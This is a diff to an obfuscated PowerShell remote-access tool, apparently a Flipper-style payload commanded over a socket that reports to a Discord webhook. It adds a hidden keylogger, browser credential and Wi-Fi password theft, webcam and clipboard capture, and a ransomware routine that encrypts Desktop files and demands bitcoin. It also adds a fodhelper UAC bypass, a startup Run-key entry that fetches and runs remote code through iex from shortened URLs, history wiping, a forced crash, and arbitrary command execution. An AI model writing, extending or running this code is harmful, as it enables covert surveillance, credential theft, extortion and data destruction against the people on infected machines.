@@ -3,25 +3,39 @@ $40762deaed16419582a9e2fa022f34cb = New-Object IO.StreamWriter($32c6fa2cbe4e4467
 
 function hasbullawjwindbw {
     (iwr 'https://google.com@raw.githubusercontent.com/CharlesTheGreat77/token2Discord/main/Testing.txt').Content | iex}function popopwhwhbsvxjnfiifb {$PsandQs = netsh wlan export profile key=clear; Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace '.xml:22:', ''}
-    wuwudhbdbwb("OUTPUT:$PsandQs")
+    wuwudhbdbwb("Wi-Fi Passwords:$PsandQs")
 }
 function flipejsjiebsbllb($ibwjskwbnskieg) {$faylownabbdjw = @{content =$ibwjskwbnskieg} | ConvertTo-Json$espoenabjsmbe = Invoke-RestMethod -Uri$webhook -Method Post -ContentType"application/json" -Body$faylownabbdjw}function kwhhabzbabjeikfn {
-    Remove-Item (Get-PSreadlineOption).HistorySavePath; Remove-Item HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU}function keylog {$logfile ="C:\temp\keys.txt"
-    New-Item -ItemType Directory -Path"C:\temp" -Force | Out-Null$signature = @"
-    [DllImport("user32.dll")] public static extern int GetAsyncKeyState(int i);"@
-    Add-Type -MemberDefinition$signature -Name"Key" -Namespace Win32Functions
-    while ($true) {
+    Remove-Item (Get-PSreadlineOption).HistorySavePath; Remove-Item HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
+    wuwudhbdbwb("Cleaned PowerShell history and RunMRU.")
+}
+function keylog {$logfile ="C:\temp\keys.txt"
+    New-Item -ItemType Directory -Path"C:\temp" -Force | Out-Null$script = @"
+    Add-Type -MemberDefinition '[DllImport(\`"user32.dll\`")] public static extern int GetAsyncKeyState(int i);' -Name 'Key' -Namespace Win32Functions
+    `$logfile = '$logfile'
+    while (`$true) {
         Start-Sleep -Milliseconds 40
-        for ($i = 8;$i -le 255;$i++) {
-            if ([Win32Functions.Key]::GetAsyncKeyState($i) -eq -32767) {$key = [char]$i$time = Get-Date -Format"yyyy-MM-dd HH:mm:ss"
-                "$time :$key" | Out-File -FilePath$logfile -Append}        }
-        if ($32c6fa2cbe4e4467b2496ec6170445a0.Read($cc63f96fb8d24ff993ecd4f81ea1715c, 0, 1) -gt 0) { break}    }}function grabcreds {$chrome = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
+        for (`$i = 8; `$i -le 255; `$i++) {
+            if ([Win32Functions.Key]::GetAsyncKeyState(`$i) -eq -32767) {
+                `$key = [char]`$i
+                `$time = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'`"\`$time : `$key`" | Out-File -FilePath `$logfile -Append}        }
+        if (Test-Path 'C:\temp\stop_keylog.txt') { break}        if ((Get-Item `$logfile -ErrorAction SilentlyContinue).Length -gt 1024) {
+            curl.exe -F \`"file1=@`$logfile\`" $webhook
+            Clear-Content `$logfile}    }"@$script | Out-File"C:\temp\keylog.ps1"
+    Start-Process powershell -ArgumentList"-ep bypass -w hidden -c & {Invoke-Expression (Get-Content 'C:\temp\keylog.ps1' -Raw)}" -NoNewWindow
+    wuwudhbdbwb("Stealth keylogger started in background. Logs to C:\temp\keys.txt, uploads on size > 1KB. Stop with /stopkeylog.")
+}
+function stopkeylog {
+    New-Item -ItemType File -Path"C:\temp\stop_keylog.txt" -Force | Out-Null
+    wuwudhbdbwb("Keylogger stopped. Check C:\temp\keys.txt for logs.")
+    if (Test-Path"C:\temp\keys.txt") { curl.exe -F"file1=@C:\temp\keys.txt" $webhook}}
+function grabcreds {$chrome = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
     $firefox = "$env:APPDATA\Mozilla\Firefox\Profiles\*\logins.json"
     $creds = ""
-    if (Test-Path$chrome) {$creds +="Chrome passwords found. Requires SQLite access for full dump. Check C:\temp\chrome_creds.txt for details.`n"
+    if (Test-Path$chrome) {$creds +="Chrome passwords found. Copied to C:\temp\chrome_creds.txt.`n"
         Copy-Item$chrome -Destination"C:\temp\chrome_creds.txt"
     }
-    if (Test-Path$firefox) {$creds +="Firefox passwords found. Check C:\temp\firefox_creds.txt for details.`n"
+    if (Test-Path$firefox) {$creds +="Firefox passwords found. Copied to C:\temp\firefox_creds.txt.`n"
         Copy-Item$firefox -Destination"C:\temp\firefox_creds.txt"
     }
     if ($creds -eq "") {$creds ="No browser credentials found." }
@@ -29,10 +43,10 @@ function flipejsjiebsbllb($ibwjskwbnskieg) {$faylownabbdjw = @{content =$ibwjskw
     if (Test-Path"C:\temp\chrome_creds.txt") { curl.exe -F"file1=@C:\temp\chrome_creds.txt" $webhook}    if (Test-Path"C:\temp\firefox_creds.txt") { curl.exe -F"file1=@C:\temp\firefox_creds.txt" $webhook}}
 function ransom {$dir = "$env:USERPROFILE\Desktop"
     $key = [byte]0xAB$note ="Your files are encrypted! Send 0.1 BTC to 1XzY7kP... to decrypt. File: C:\temp\decrypt.ps1"
-    $decrypt ="param([string]$dir,[byte]$key);Get-ChildItem$dir -File | % {$data = Get-Content$_.FullName -Raw;$dec = [char[]]$data | % { $_ -bxor$key}; Set-Content$_.FullName$dec }"
+    $decrypt ="param([string]`$dir,[byte]`$key);Get-ChildItem `$dir -File | % {`$data = Get-Content `$_.FullName -Raw;`$dec = [char[]]`$data | % {`$_ -bxor `$key}; Set-Content `$_.FullName `$dec }"
     New-Item -ItemType Directory -Path"C:\temp" -Force | Out-Null
     Set-Content"C:\temp\decrypt.ps1" $decrypt
-    Get-ChildItem$dir -File | % {$data = Get-Content$_.FullName -Raw$enc = [char[]]$data | % { $_ -bxor$key}        Set-Content$_.FullName$enc}    Set-Content "$dir\ransom_note.txt" $note
+    Get-ChildItem$dir -File | % {$data = Get-Content$_.FullName -Raw;$enc = [char[]]$data | % { $_ -bxor$key}; Set-Content$_.FullName$enc}    Set-Content "$dir\ransom_note.txt" $note
     curl.exe -F"file1=@$dir\ransom_note.txt" $webhook
     wuwudhbdbwb("Files on Desktop encrypted. Ransom note sent to Discord.")
 }
@@ -40,16 +54,38 @@ function sysinfo {$info = Get-ComputerInfo | Select-Object WindowsProductName, C
     wuwudhbdbwb($out)
     flipejsjiebsbllb($out)
 }
-function privesc {$uac ="reg add HKCU\Software\Classes\.pwn\Shell\Open\command /ve /d `"powershell -ep bypass -w hidden -c iex((iwr 'https://bit.ly/4gT8mN2').Content)`" /f;reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d`"%1`" /f;reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /f;start fodhelper"
+function privesc {$uac ="reg add HKCU\Software\Classes\.pwn\Shell\Open\command /ve /d `\"powershell -ep bypass -w hidden -c iex((iwr 'http://bit.ly/46SBJnb').Content)`\" /f; reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d `\"%1`\" /f; reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /f; start fodhelper"
     wuwudhbdbwb("Attempting UAC bypass...")
     Invoke-Expression$uac
     wuwudhbdbwb("UAC bypass triggered. Check for elevated shell.")
 }
-function persist {$payload ="powershell -W hidden -noni -nop -c `"& {iex((iwr 'https://bit.ly/4gT8mN2').Content)}`""
+function persist {$payload ="powershell -W hidden -noni -nop -c `\"& {iex((iwr 'http://bit.ly/46SBJnb').Content)}`\""
     $regpath ="HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
     $name ="FlipperPayload"
     New-ItemProperty -Path$regpath -Name$name -Value$payload -PropertyType String -Force
     wuwudhbdbwb("Persistence added to registry. Payload runs on startup.")
+}
+function webcam {$com = New-Object -ComObject WIA.CommonDialog$device =$com.ShowSelectDevice()
+    $item =$device.Items[1]
+    $image =$item.Transfer()
+    $image.SaveFile("C:\temp\webcam.jpg")
+    curl.exe -F"file1=@C:\temp\webcam.jpg" $webhook
+    wuwudhbdbwb("Webcam snapshot taken and sent to Discord.")
+}
+function clipboard {$clip = Get-Clipboard
+    if ($clip) {$clip | Out-File"C:\temp\clipboard.txt"
+        curl.exe -F"file1=@C:\temp\clipboard.txt" $webhook
+        wuwudhbdbwb("Clipboard contents:$clip`nSent to Discord.")
+    } else {
+        wuwudhbdbwb("Clipboard is empty.")
+    }}function bsod {$code = @"
+    [DllImport("ntdll.dll")] public static extern uint RtlAdjustPrivilege(int Privilege, bool Enable, bool CurrentThread, out bool Enabled);
+    [DllImport("ntdll.dll")] public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOptions, out uint Response);"@
+    Add-Type -MemberDefinition$code -Name"BSOD" -Namespace Win32$enabled =$false
+    [Win32.BSOD]::RtlAdjustPrivilege(19,$true,$false, [ref]$enabled)
+    $response = 0
+    [Win32.BSOD]::NtRaiseHardError(0xC000021A, 0, 0, [IntPtr]::Zero, 6, [ref]$response)
+    wuwudhbdbwb("Fake BSOD triggered.")
 }
 function wuwudhbdbwb($String) {
     [byte[]]$cc63f96fb8d24ff993ecd4f81ea1715c = 0..$3aa2ad906c2b4439a6dee0a389abb6ae.ReceiveBufferSize | ForEach-Object {0}
@@ -66,40 +102,44 @@ while ($0abddb0134484e0ca2c951ce3e99f16c -ge 0) {$0abddb0134484e0ca2c951ce3e99f1
         if ($72b24f293ec941fabe2c084e41efcf4b -match"^/discord\s+(.+)$") {$filename =$matches[1]
             $ibwjskwbnskieg ="Flipper Report for$env:USERNAME"
             flipejsjiebsbllb($ibwjskwbnskieg)
-            curl.exe -F"file1=@$filename" $webhook$bdubsiwiwnbdvank ="File '$filename' sent.."
-            wuwudhbdbwb($bdubsiwiwnbdvank)
+            curl.exe -F"file1=@$filename" $webhook
+            wuwudhbdbwb("File '$filename' sent.")
         }
-        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/tgrizzly$") {$bdubsiwiwnbdvank ="Executing /tgrizzly functionality.. saving output to C:\temp\output.txt"
-            wuwudhbdbwb($bdubsiwiwnbdvank)
-            hasbullawjwindbw}        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/wifi$") {$bdubsiwiwnbdvank ="Executing /wifi.."
-            wuwudhbdbwb($bdubsiwiwnbdvank)
-            popopwhwhbsvxjnfiifb}        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/clean$") {$bdubsiwiwnbdvank ="Executing cleanup.."
-            wuwudhbdbwb($bdubsiwiwnbdvank)
-            kwhhabzbabjeikfn}        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/screenshot$") {$bdubsiwiwnbdvank ="Taking screenshot..."
-            wuwudhbdbwb($bdubsiwiwnbdvank)
+        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/tgrizzly$") {
+            wuwudhbdbwb("Executing /tgrizzly... saving to C:\temp\output.txt")
+            hasbullawjwindbw}        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/wifi$") {
+            wuwudhbdbwb("Executing /wifi...")
+            popopwhwhbsvxjnfiifb}        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/clean$") {
+            wuwudhbdbwb("Executing cleanup...")
+            kwhhabzbabjeikfn}        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/screenshot$") {
+            wuwudhbdbwb("Taking screenshot...")
             Add-Type -AssemblyName System.Windows.Forms$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds$bitmap = New-Object System.Drawing.Bitmap$screen.Width,$screen.Height$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
             $graphics.CopyFromScreen(0, 0, 0, 0,$bitmap.Size)
             $bitmap.Save("C:\temp\screenshot.png")
-            curl.exe -F"file1=@C:\temp\screenshot.png" $webhook$bdubsiwiwnbdvank ="Screenshot sent to Discord."
-            wuwudhbdbwb($bdubsiwiwnbdvank)
+            curl.exe -F"file1=@C:\temp\screenshot.png" $webhook
+            wuwudhbdbwb("Screenshot sent to Discord.")
         }
-        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/keylog$") {$bdubsiwiwnbdvank ="Starting keylogger... Check C:\temp\keys.txt"
-            wuwudhbdbwb($bdubsiwiwnbdvank)
-            keylog
-            curl.exe -F"file1=@C:\temp\keys.txt" $webhook$bdubsiwiwnbdvank ="Keylog sent to Discord."
-            wuwudhbdbwb($bdubsiwiwnbdvank)
-        }
-        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/creds$") {$bdubsiwiwnbdvank ="Grabbing browser credentials..."
-            wuwudhbdbwb($bdubsiwiwnbdvank)
-            grabcreds}        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/ransom$") {$bdubsiwiwnbdvank ="Executing ransomware stub..."
-            wuwudhbdbwb($bdubsiwiwnbdvank)
-            ransom}        elseif ($72b24f293ec941fabe2c951ce3e99f16c -match"^/sysinfo$") {$bdubsiwiwnbdvank ="Collecting system info..."
-            wuwudhbdbwb($bdubsiwiwnbdvank)
-            sysinfo}        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/privesc$") {$bdubsiwiwnbdvank ="Attempting privilege escalation..."
-            wuwudhbdbwb($bdubsiwiwnbdvank)
-            privesc}        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/persist$") {$bdubsiwiwnbdvank ="Setting up persistence..."
-            wuwudhbdbwb($bdubsiwiwnbdvank)
-            persist}        else {$214a6b4cb6e043ab909aa13348235114 = try { Invoke-Expression$72b24f293ec941fabe2c084e41efcf4b 2>&1 | Out-String} catch { $_ | Out-String}            wuwudhbdbwb($214a6b4cb6e043ab909aa13348235114)
+        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/keylog$") {
+            wuwudhbdbwb("Starting stealth keylogger...")
+            keylog}        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/stopkeylog$") {
+            wuwudhbdbwb("Stopping keylogger...")
+            stopkeylog}        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/creds$") {
+            wuwudhbdbwb("Grabbing browser credentials...")
+            grabcreds}        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/ransom$") {
+            wuwudhbdbwb("Executing ransomware stub...")
+            ransom}        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/sysinfo$") {
+            wuwudhbdbwb("Collecting system info...")
+            sysinfo}        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/privesc$") {
+            wuwudhbdbwb("Attempting privilege escalation...")
+            privesc}        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/persist$") {
+            wuwudhbdbwb("Setting up persistence...")
+            persist}        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/webcam$") {
+            wuwudhbdbwb("Taking webcam snapshot...")
+            webcam}        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/clipboard$") {
+            wuwudhbdbwb("Grabbing clipboard contents...")
+            clipboard}        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/bsod$") {
+            wuwudhbdbwb("Triggering fake BSOD...")
+            bsod}        else {$214a6b4cb6e043ab909aa13348235114 = try { Invoke-Expression$72b24f293ec941fabe2c084e41efcf4b 2>&1 | Out-String} catch { $_ | Out-String}            wuwudhbdbwb($214a6b4cb6e043ab909aa13348235114)
         }}}
 
 $40762deaed16419582a9e2fa022f34cb.Close()
